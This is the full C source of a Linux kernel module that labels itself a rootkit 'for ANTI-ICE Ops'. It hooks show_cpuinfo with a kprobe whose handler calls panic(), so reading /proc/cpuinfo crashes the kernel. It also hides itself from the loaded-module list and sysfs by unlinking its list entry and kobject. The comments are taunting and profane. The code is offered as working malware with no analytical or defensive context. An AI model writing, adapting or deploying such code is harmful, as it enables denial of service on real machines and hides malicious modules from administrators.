#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("nullcollective");
MODULE_DESCRIPTION("kernel-rootkit for ANTI-ICE Ops");

static struct kprobe kp;

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    // load module, then have user 'cat /proc/cpuinfo' lol
    panic("FUCK ICE"); return 0; // ╯°□°)╯︵ ┻━┻
}
static int __init icepanic_init(void)
{
    struct module *this_module = THIS_MODULE;

    // kprobe reg cpuinfo
    kp.symbol_name = "show_cpuinfo";
    kp.pre_handler = handler_pre;
    register_kprobe(&kp);
    // stealth the kernel module
    list_del(&this_module->list);
    kobject_del(&this_module->mkobj.kobj);
    return 0;
}
static void __exit icepanic_exit(void)
{unregister_kprobe(&kp);}

module_init(icepanic_init);
module_exit(icepanic_exit);
